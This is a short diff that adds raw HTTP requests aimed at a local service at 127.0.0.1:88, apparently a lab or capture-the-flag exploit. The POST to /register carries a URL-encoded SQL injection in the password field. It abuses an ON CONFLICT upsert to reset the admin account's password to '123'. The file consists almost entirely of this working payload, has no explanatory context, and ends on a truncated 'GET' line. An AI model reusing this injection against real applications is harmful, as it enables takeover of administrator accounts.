@@ -1,0 +1,11 @@
+GET /127.0.0.1:88/ HTTP/1.1
+Host: 127.0.0.1:88
+
+POST /register HTTP/1.1
+Host: 127.0.0.1:88
+Content-Type: application/x-www-form-urlencoded
+Content-Length: [calculated]
+
+username=admin&password=test%27)%20ON%20CONFLICT%20(username)%20DO%20UPDATE%20SET%20password%20=%20%27123%27;
+
+GET
